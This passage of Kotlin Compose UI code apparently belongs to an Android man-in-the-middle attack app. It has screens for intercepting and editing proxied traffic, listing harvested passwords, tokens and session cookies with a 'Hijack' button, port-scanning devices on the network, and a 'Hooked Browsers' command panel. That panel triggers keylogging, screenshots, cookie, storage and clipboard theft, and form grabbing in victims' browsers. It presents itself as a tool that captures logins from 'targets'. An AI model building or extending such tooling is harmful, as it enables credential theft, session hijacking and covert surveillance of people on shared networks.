            colors = CardDefaults.cardColors(containerColor = CgBg),
            shape = RoundedCornerShape(20.dp),
            border = BorderStroke(1.dp, CgGray.copy(0.2f))) {
            Column(Modifier.fillMaxSize()) {
                // title bar
                Row(Modifier.fillMaxWidth().background(CgCard).padding(horizontal = 16.dp, vertical = 12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column(Modifier.weight(1f)) {
                        Text("${pkt.method ?: ""} ${pkt.protocol}", fontSize = 12.sp, color = CgGray)
                        Text(pkt.host, fontSize = 15.sp, fontWeight = FontWeight.Bold, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                    }
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                        pkt.statusCode?.let {
                            Badge(containerColor = (if (it < 400) CgGreen else CgRed).copy(0.2f)) {
                                Text("$it", fontSize = 11.sp, color = if (it < 400) CgGreen else CgRed,
                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
                            }
                        }
                        IconButton(onClick = onDismiss, modifier = Modifier.size(32.dp)) {
                            Icon(Icons.Filled.Close, contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp))
                        }
                    }
                }

                // tab row
                ScrollableTabRow(selectedTabIndex = tab, containerColor = CgSurface,
                    contentColor = CgGreen, edgePadding = 8.dp,
                    indicator = { tabPositions ->
                        TabRowDefaults.SecondaryIndicator(modifier = Modifier.fillMaxWidth().wrapContentSize(Alignment.BottomStart).width(tabPositions[tab].width).offset(x = tabPositions[tab].left), color = CgGreen, height = 2.dp)
                    }) {
                    tabs.forEachIndexed { i, title ->
                        Tab(selected = tab == i, onClick = { tab = i },
                            text = { Text(title, fontSize = 11.sp, fontWeight = if (tab == i) FontWeight.Bold else FontWeight.Normal) })
                    }
                }

                // content
                LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                    when (tabs.getOrNull(tab)) {
                        "Overview" -> {
                            item {
                                // summary card
                                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                                    Column(Modifier.padding(14.dp)) {
                                        Row {
                                            Icon(getContentIcon(analysis.contentType), contentDescription = null, tint = CgCyan, modifier = Modifier.size(18.dp))
                                            Spacer(Modifier.width(8.dp))
                                            Text(analysis.summary, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.SemiBold)
                                        }
                                        Spacer(Modifier.height(10.dp))
                                        InfoRow("Source", pkt.sourceIp)
                                        InfoRow("Protocol", pkt.protocol)
                                        InfoRow("Path", pkt.path)
                                        InfoRow("Size", formatBytes(analysis.size.toLong()))
                                        InfoRow("Encrypted", if (analysis.isEncrypted) "Yes (HTTPS)" else "No (HTTP)")
                                        if (analysis.cookieCount > 0) InfoRow("Cookies", "${analysis.cookieCount} cookies present")
                                        analysis.redirectUrl?.let { InfoRow("Redirects to", it) }
                                    }
                                }
                            }
                            if (analysis.sensitiveFields.isNotEmpty()) {
                                item {
                                    Card(colors = CardDefaults.cardColors(containerColor = CgRed.copy(0.06f)),
                                        shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgRed.copy(0.3f))) {
                                        Column(Modifier.padding(14.dp)) {
                                            Row(verticalAlignment = Alignment.CenterVertically) {
                                                Icon(Icons.Filled.Warning, contentDescription = null, tint = CgRed, modifier = Modifier.size(16.dp))
                                                Spacer(Modifier.width(6.dp))
                                                Text("${analysis.sensitiveFields.size} SENSITIVE FIELDS DETECTED", fontSize = 11.sp, color = CgRed, fontWeight = FontWeight.Bold, letterSpacing = 0.5.sp)
                                            }
                                            Spacer(Modifier.height(8.dp))
                                            analysis.sensitiveFields.take(5).forEach { field ->
                                                Row(Modifier.padding(vertical = 3.dp)) {
                                                    Box(Modifier.size(8.dp).clip(CircleShape).background(
                                                        when (field.risk) { RiskLevel.HIGH -> CgRed; RiskLevel.MEDIUM -> CgAmber; else -> CgGray }
                                                    ).align(Alignment.CenterVertically))
                                                    Spacer(Modifier.width(8.dp))
                                                    Text("${field.key}: ", fontSize = 11.sp, color = CgGray)
                                                    Text(field.value.take(50), fontSize = 11.sp, color = CgWhite, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Medium)
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        "Sensitive" -> {
                            items(analysis.sensitiveFields) { field ->
                                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp),
                                    border = BorderStroke(1.dp, when (field.risk) { RiskLevel.HIGH -> CgRed.copy(0.4f); RiskLevel.MEDIUM -> CgAmber.copy(0.4f); else -> CgGray.copy(0.2f) })) {
                                    Column(Modifier.padding(12.dp)) {
                                        Row(verticalAlignment = Alignment.CenterVertically) {
                                            Badge(containerColor = when (field.risk) { RiskLevel.HIGH -> CgRed.copy(0.2f); RiskLevel.MEDIUM -> CgAmber.copy(0.2f); else -> CgGray.copy(0.2f) }) {
                                                Text(field.risk.name, fontSize = 8.sp, color = when (field.risk) { RiskLevel.HIGH -> CgRed; RiskLevel.MEDIUM -> CgAmber; else -> CgGray },
                                                    modifier = Modifier.padding(horizontal = 4.dp))
                                            }
                                            Spacer(Modifier.width(8.dp))
                                            Text(field.key, fontSize = 12.sp, color = CgGray, fontWeight = FontWeight.Medium)
                                        }
                                        Spacer(Modifier.height(6.dp))
                                        SelectionContainer {
                                            Text(field.value, fontSize = 13.sp, color = CgWhite, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                                        }
                                    }
                                }
                            }
                        }
                        "JSON" -> {
                            item {
                                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                                    SelectionContainer {
                                        Text(analysis.jsonTree ?: "", fontSize = 10.sp, color = CgDimGreen,
                                            fontFamily = FontFamily.Monospace, modifier = Modifier.padding(12.dp))
                                    }
                                }
                            }
                        }
                        "Image" -> {
                            item {
                                analysis.imageData?.let { b64 ->
                                    val bytes = android.util.Base64.decode(b64.substringAfter(","), android.util.Base64.DEFAULT)
                                    val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                    bmp?.let {
                                        Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                                            Image(bitmap = it.asImageBitmap(), contentDescription = "Response image",
                                                modifier = Modifier.fillMaxWidth().padding(8.dp))
                                        }
                                    }
                                }
                            }
                        }
                        "Form" -> {
                            items(analysis.formFields.entries.toList()) { (k, v) ->
                                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
                                    Row(Modifier.padding(12.dp)) {
                                        Text("$k: ", fontSize = 12.sp, color = CgGray, fontWeight = FontWeight.Medium)
                                        SelectionContainer {
                                            Text(v, fontSize = 12.sp, color = CgWhite, fontFamily = FontFamily.Monospace)
                                        }
                                    }
                                }
                            }
                        }
                        "Headers" -> {
                            items(pkt.headers.entries.toList()) { (k, v) ->
                                Row(Modifier.padding(vertical = 3.dp)) {
                                    Text("$k: ", fontSize = 11.sp, color = CgCyan, fontWeight = FontWeight.Medium, modifier = Modifier.width(140.dp))
                                    Text(v.take(80), fontSize = 11.sp, color = CgGray, fontFamily = FontFamily.Monospace, modifier = Modifier.weight(1f))
                                }
                                HorizontalDivider(color = CgGray.copy(0.1f))
                            }
                        }
                        "Raw" -> {
                            item {
                                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                                    SelectionContainer {
                                        Text(analysis.rawBody.ifBlank { "(empty body)" }, fontSize = 10.sp,
                                            color = CgWhite.copy(0.8f), fontFamily = FontFamily.Monospace, modifier = Modifier.padding(12.dp))
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun InfoRow(label: String, value: String) {
    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp)) {
        Text(label, fontSize = 11.sp, color = CgGray, modifier = Modifier.width(90.dp))
        Text(value, fontSize = 11.sp, color = CgWhite, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
    }
}

@Composable
fun InterceptCard(packet: InterceptedPacket, isPending: Boolean, onForward: (InterceptedPacket) -> Unit, onDrop: () -> Unit) {
    var editedBody by remember { mutableStateOf(TextFieldValue(String(packet.body))) }
    var editedPath by remember { mutableStateOf(TextFieldValue(packet.path)) }
    val color = if (packet.isRequest) CgCyan else CgAmber

    Card(Modifier.fillMaxWidth().padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(containerColor = color.copy(0.06f)),
        shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, color.copy(0.35f))) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text("${packet.direction.name} · ${packet.protocol}", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                Text(packet.sourceIp, fontSize = 10.sp, color = CgGray)
            }
            Spacer(Modifier.height(4.dp))
            Text("${packet.method ?: ""} ${packet.host}${packet.path}", fontSize = 11.sp, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
            if (isPending) {
                Spacer(Modifier.height(10.dp))
                OutlinedTextField(value = editedPath, onValueChange = { editedPath = it },
                    label = { Text("Path", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                        unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                Spacer(Modifier.height(6.dp))
                OutlinedTextField(value = editedBody, onValueChange = { editedBody = it },
                    label = { Text("Body", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 10.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth().heightIn(min = 60.dp, max = 200.dp), shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                        unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { onForward(packet.copy(path = editedPath.text, body = editedBody.text.toByteArray())) },
                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)),
                        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgGreen.copy(0.5f))) {
                        Icon(Icons.Filled.Send, contentDescription = null, tint = CgGreen, modifier = Modifier.size(14.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Forward", color = CgGreen, fontSize = 12.sp)
                    }
                    Button(onClick = onDrop, colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)),
                        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
                        Icon(Icons.Filled.Block, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Drop", color = CgRed, fontSize = 12.sp)
                    }
                }
            }
        }
    }
}

// ============================
// CREDENTIALS SCREEN
// ============================
@Composable
fun CredentialsScreen(credentials: List<HarvestedCredential>, onClear: () -> Unit, onGoHijack: () -> Unit) {
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(16.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Column {
                Text("Credentials", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
                Text("${credentials.size} captured", fontSize = 12.sp, color = if (credentials.isEmpty()) CgGray else CgRed)
            }
            if (credentials.isNotEmpty()) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    FilledTonalButton(onClick = onGoHijack,
                        colors = ButtonDefaults.filledTonalButtonColors(containerColor = CgCyan.copy(0.15f)),
                        shape = RoundedCornerShape(10.dp)) {
                        Icon(Icons.Filled.Lock, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Hijack", fontSize = 11.sp, color = CgCyan)
                    }
                    OutlinedButton(onClick = onClear, shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
                        Text("Clear", fontSize = 11.sp, color = CgRed)
                    }
                }
            }
        }
        if (credentials.isEmpty()) {
            EmptyState(Icons.Filled.Key, "No credentials captured", "Start capture and wait for targets to log in")
        } else {
            LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(credentials.reversed()) { CredentialCard(it) }
            }
        }
    }
}

@Composable
fun CredentialCard(cred: HarvestedCredential) {
    val typeColor = when (cred.type) {
        CredentialType.FORM_LOGIN -> CgRed
        CredentialType.BASIC_AUTH -> CgAmber
        CredentialType.BEARER_TOKEN -> CgCyan
        CredentialType.JSON_LOGIN -> CgMagenta
        CredentialType.API_KEY -> CgBlue
        CredentialType.COOKIE_SESSION -> CgDimGreen
    }
    var expanded by remember { mutableStateOf(false) }
    Card(Modifier.fillMaxWidth().clickable { expanded = !expanded },
        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, typeColor.copy(0.3f))) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(typeColor.copy(0.15f)), contentAlignment = Alignment.Center) {
                        Icon(Icons.Filled.Key, contentDescription = null, tint = typeColor, modifier = Modifier.size(18.dp))
                    }
                    Spacer(Modifier.width(10.dp))
                    Column {
                        Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        Text(cred.type.name.replace("_", " "), fontSize = 10.sp, color = typeColor)
                    }
                }
                Text(cred.sourceIp, fontSize = 10.sp, color = CgGray)
            }
            Spacer(Modifier.height(10.dp))
            cred.username?.let { CredRow("User", it, CgCyan) }
            cred.password?.let { CredRow("Pass", it, CgRed) }
            cred.token?.let { CredRow("Token", it.take(40) + if (it.length > 40) "…" else "", CgAmber) }
            if (expanded && cred.rawFields.isNotEmpty()) {
                Spacer(Modifier.height(10.dp))
                HorizontalDivider(color = CgGray.copy(0.15f))
                Spacer(Modifier.height(8.dp))
                cred.rawFields.entries.forEach { (k, v) ->
                    Row(Modifier.padding(vertical = 1.dp)) {
                        Text("$k", fontSize = 10.sp, color = CgGray, modifier = Modifier.width(100.dp))
                        Text(v, fontSize = 10.sp, color = CgWhite, fontFamily = FontFamily.Monospace, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
                    }
                }
            }
        }
    }
}

@Composable
fun CredRow(label: String, value: String, color: Color) {
    Row(Modifier.padding(vertical = 2.dp), verticalAlignment = Alignment.CenterVertically) {
        Box(Modifier.size(24.dp).clip(RoundedCornerShape(4.dp)).background(color.copy(0.1f)), contentAlignment = Alignment.Center) {
            Text(label.take(1), fontSize = 9.sp, color = color, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.width(8.dp))
        SelectionContainer {
            Text(value, fontSize = 12.sp, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
        }
    }
}

// ============================
// DEVICES SCREEN
// ============================
@Composable
fun DevicesScreen(
    devices: List<ConnectedDevice>, networkHosts: List<NetworkHost>,
    gatewayIp: String, onSetNickname: (String, String) -> Unit,
    onPortScan: (String) -> Unit, portScanResults: Map<String, PortScanResult>,
    onGoSetup: () -> Unit
) {
    val allIps = devices.map { it.ip }.toSet()
    val extraHosts = networkHosts.filter { it.ip !in allIps && !it.isGateway }

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text("Devices", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
                    Text("${devices.size} proxied · ${extraHosts.size} discovered", fontSize = 12.sp, color = CgGray)
                }
                OutlinedButton(onClick = onGoSetup, shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgGreen.copy(0.5f))) {
                    Icon(Icons.Filled.QrCode, contentDescription = null, tint = CgGreen, modifier = Modifier.size(14.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("QR Setup", fontSize = 11.sp, color = CgGreen)
                }
            }
        }

        if (devices.isEmpty() && extraHosts.isEmpty()) {
            item { EmptyState(Icons.Filled.Devices, "No devices found", "Connect to hotspot, then tap QR Setup to configure proxy") }
        }

        if (devices.isNotEmpty()) {
            item { CgSectionLabel("Proxied (intercepting traffic)") }
            items(devices) { device ->
                RichDeviceCard(device, portScanResults[device.ip], onSetNickname, onPortScan)
            }
        }

        if (extraHosts.isNotEmpty()) {
            item { CgSectionLabel("Discovered (need proxy setup)") }
            items(extraHosts) { host ->
                DiscoveredHostCard(host, portScanResults[host.ip], onPortScan)
            }
        }
    }
}

@Composable
fun RichDeviceCard(device: ConnectedDevice, scanResult: PortScanResult?, onSetNickname: (String, String) -> Unit, onPortScan: (String) -> Unit) {
    var showNickname by remember { mutableStateOf(false) }
    var nickname by remember { mutableStateOf(TextFieldValue(device.hostname ?: "")) }
    var showPorts by remember { mutableStateOf(false) }
    val os = OsFingerprinter.fingerprint(device.userAgent)
    val browser = OsFingerprinter.getBrowserInfo(device.userAgent)

    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
        shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, if (device.isHooked) CgMagenta.copy(0.3f) else CgGreen.copy(0.15f))) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                // OS icon area
                Box(Modifier.size(46.dp).clip(RoundedCornerShape(12.dp))
                    .background(Brush.radialGradient(listOf(
                        if (device.isHooked) CgMagenta.copy(0.2f) else CgGreen.copy(0.15f), CgBg
                    ))), contentAlignment = Alignment.Center) {
                    Icon(getOsIcon(os.os), contentDescription = null,
                        tint = if (device.isHooked) CgMagenta else CgGreen, modifier = Modifier.size(22.dp))
                }
                Spacer(Modifier.width(12.dp))
                Column(Modifier.weight(1f)) {
                    Text(device.hostname ?: device.ip, fontSize = 15.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    Text(device.ip, fontSize = 11.sp, color = CgGray)
                    Text("${os.details.ifBlank { os.os }} · $browser", fontSize = 10.sp, color = CgGray.copy(0.7f))
                }
                Column(horizontalAlignment = Alignment.End) {
                    if (device.isHooked) Badge(containerColor = CgMagenta) {
                        Text("HOOKED", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp))
                    }
                    Spacer(Modifier.height(2.dp))
                    Badge(containerColor = CgGreen.copy(0.2f)) {
                        Text("PROXIED", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp))
                    }
                }
            }

            Spacer(Modifier.height(10.dp))

            // stats row
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                MiniStat("Requests", "${device.requestCount}", CgCyan)
                MiniStat("Traffic", formatBytes(device.bytesTransferred), CgBlue)
                MiniStat("OS", os.os.take(10), CgAmber)
            }

            // open ports
            scanResult?.let { result ->
                if (result.openPorts.isNotEmpty()) {
                    Spacer(Modifier.height(8.dp))
                    Row(Modifier.fillMaxWidth().clickable { showPorts = !showPorts }, verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Settings, contentDescription = null, tint = CgOrange, modifier = Modifier.size(14.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("${result.openPorts.size} open ports", fontSize = 11.sp, color = CgOrange)
                        Spacer(Modifier.width(6.dp))
                        Text(result.openPorts.take(4).joinToString(", ") { "${it.port}/${it.service}" },
                            fontSize = 10.sp, color = CgGray, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
                        Icon(if (showPorts) Icons.Filled.ExpandLess else Icons.Filled.ExpandMore,
                            contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                    }
                    if (showPorts) {
                        Spacer(Modifier.height(6.dp))
                        result.openPorts.forEach { port ->
                            Row(Modifier.padding(vertical = 2.dp)) {
                                Text("${port.port}", fontSize = 11.sp, color = CgOrange, fontFamily = FontFamily.Monospace, modifier = Modifier.width(48.dp))
                                Text(port.service, fontSize = 11.sp, color = CgWhite, modifier = Modifier.width(80.dp))
                                port.banner?.let { Text(it.take(40), fontSize = 10.sp, color = CgGray, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis) }
                            }
                        }
                    }
                }
            }

            // action row
            Spacer(Modifier.height(10.dp))
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedButton(onClick = { onPortScan(device.ip) }, shape = RoundedCornerShape(8.dp),
                    border = BorderStroke(1.dp, CgOrange.copy(0.4f)), modifier = Modifier.weight(1f),
                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)) {
                    Icon(Icons.Filled.Search, contentDescription = null, tint = CgOrange, modifier = Modifier.size(12.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Port Scan", fontSize = 10.sp, color = CgOrange)
                }
                OutlinedButton(onClick = { showNickname = !showNickname }, shape = RoundedCornerShape(8.dp),
                    border = BorderStroke(1.dp, CgGray.copy(0.3f)), modifier = Modifier.weight(1f),
                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)) {
                    Icon(Icons.Filled.Edit, contentDescription = null, tint = CgGray, modifier = Modifier.size(12.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Rename", fontSize = 10.sp, color = CgGray)
                }
            }

            if (showNickname) {
                Spacer(Modifier.height(8.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(value = nickname, onValueChange = { nickname = it },
                        placeholder = { Text("Device nickname...", fontSize = 11.sp) },
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
                        modifier = Modifier.weight(1f).height(44.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                    Spacer(Modifier.width(6.dp))
                    FilledIconButton(onClick = { onSetNickname(device.ip, nickname.text); showNickname = false },
                        colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)),
                        modifier = Modifier.size(44.dp)) {
                        Icon(Icons.Filled.Check, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                    }
                }
            }
        }
    }
}

@Composable
fun DiscoveredHostCard(host: NetworkHost, scanResult: PortScanResult?, onPortScan: (String) -> Unit) {
    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
        shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgAmber.copy(0.15f))) {
        Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(38.dp).clip(RoundedCornerShape(10.dp)).background(CgAmber.copy(0.1f)), contentAlignment = Alignment.Center) {
                Icon(getOsIcon("Unknown"), contentDescription = null, tint = CgAmber, modifier = Modifier.size(18.dp))
            }
            Spacer(Modifier.width(10.dp))
            Column(Modifier.weight(1f)) {
                Text(host.hostname ?: host.ip, fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    host.mac?.let { Text(it, fontSize = 9.sp, color = CgGray.copy(0.6f)) }
                    host.vendor?.let { Text(it, fontSize = 9.sp, color = CgCyan.copy(0.6f)) }
                }
                scanResult?.let { Text("${it.openPorts.size} open ports", fontSize = 9.sp, color = CgOrange) }
            }
            Column(horizontalAlignment = Alignment.End) {
                Badge(containerColor = CgAmber.copy(0.2f)) { Text("NO PROXY", fontSize = 7.sp, color = CgAmber, modifier = Modifier.padding(horizontal = 4.dp)) }
                Spacer(Modifier.height(4.dp))
                IconButton(onClick = { onPortScan(host.ip) }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Filled.Search, contentDescription = null, tint = CgOrange, modifier = Modifier.size(14.dp))
                }
            }
        }
    }
}

@Composable
fun MiniStat(label: String, value: String, color: Color) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Text(value, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = color)
        Text(label, fontSize = 9.sp, color = CgGray)
    }
}

fun getOsIcon(os: String) = when {
    os.contains("Android", true) -> Icons.Filled.PhoneAndroid
    os.contains("iOS", true) || os.contains("iPhone", true) || os.contains("iPad", true) -> Icons.Filled.Phone
    os.contains("Windows", true) -> Icons.Filled.Laptop
    os.contains("Mac", true) -> Icons.Filled.Laptop
    os.contains("Linux", true) -> Icons.Filled.Computer
    os.contains("Chrome", true) -> Icons.Filled.Web
    else -> Icons.Filled.Devices
}

// ============================
// HOOKED SCREEN
// ============================
@Composable
fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand: (String, String, Map<String, Any?>) -> Unit) {
    var selectedSession by remember { mutableStateOf<String?>(null) }
    var jsInput by remember { mutableStateOf(TextFieldValue("")) }

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item {
            Text("Hooked Browsers", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Text("${sessions.count { it.isAlive }} live sessions", fontSize = 12.sp, color = CgGray)
        }
        if (sessions.isEmpty()) {
            item { EmptyState(Icons.Filled.BugReport, "No hooked sessions", "Hook agent loads when target visits HTTP page via your proxy") }
        }
        items(sessions.filter { it.isAlive }) { session ->
            val isSelected = selectedSession == session.sessionId
            Card(Modifier.fillMaxWidth().clickable { selectedSession = if (isSelected) null else session.sessionId },
                colors = CardDefaults.cardColors(containerColor = if (isSelected) CgMagenta.copy(0.06f) else CgCard),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, if (isSelected) CgMagenta.copy(0.5f) else CgGray.copy(0.15f))) {
                Column(Modifier.padding(14.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Box(Modifier.size(40.dp).clip(RoundedCornerShape(10.dp)).background(CgMagenta.copy(0.15f)), contentAlignment = Alignment.Center) {
                                Icon(Icons.Filled.BugReport, contentDescription = null, tint = CgMagenta, modifier = Modifier.size(20.dp))
                            }
                            Spacer(Modifier.width(10.dp))
                            Column {
                                Text(session.pageUrl.take(42), fontSize = 12.sp, color = CgCyan, fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                Text("${session.platform} · ${session.screenSize}", fontSize = 10.sp, color = CgGray)
                            }
                        }
                        Column(horizontalAlignment = Alignment.End) {
                            Badge(containerColor = CgGreen.copy(0.2f)) { Text("LIVE", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp)) }
                            Spacer(Modifier.height(2.dp))
                            Text("keys:${session.keylog.size}", fontSize = 9.sp, color = CgGray)
                        }
                    }

                    if (isSelected) {
                        Spacer(Modifier.height(12.dp))
                        HorizontalDivider(color = CgMagenta.copy(0.2f))
                        Spacer(Modifier.height(10.dp))

                        // command grid
                        Text("COMMANDS", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp, modifier = Modifier.padding(bottom = 8.dp))
                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            HookCmd("Screenshot", Icons.Filled.Camera, CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                            HookCmd("Keylog ON", Icons.Filled.Keyboard, CgMagenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
                            HookCmd("Keylog OFF", Icons.Filled.Keyboard, CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
                            HookCmd("Cookies", Icons.Filled.Circle, CgAmber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
                            HookCmd("Storage", Icons.Filled.Storage, CgAmber) { onCommand(session.sessionId, "get_storage", emptyMap()) }
                            HookCmd("Forms", Icons.Filled.List, CgRed) { onCommand(session.sessionId, "form_grab", emptyMap()) }
                            HookCmd("Form Tap", Icons.Filled.TouchApp, CgRed) { onCommand(session.sessionId, "form_intercept_start", emptyMap()) }
                            HookCmd("Clipboard", Icons.Filled.ContentCopy, CgDimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
                            HookCmd("Clip Mon", Icons.Filled.Monitor, CgDimGreen) { onCommand(session.sessionId, "clipboard_monitor_start", emptyMap()) }
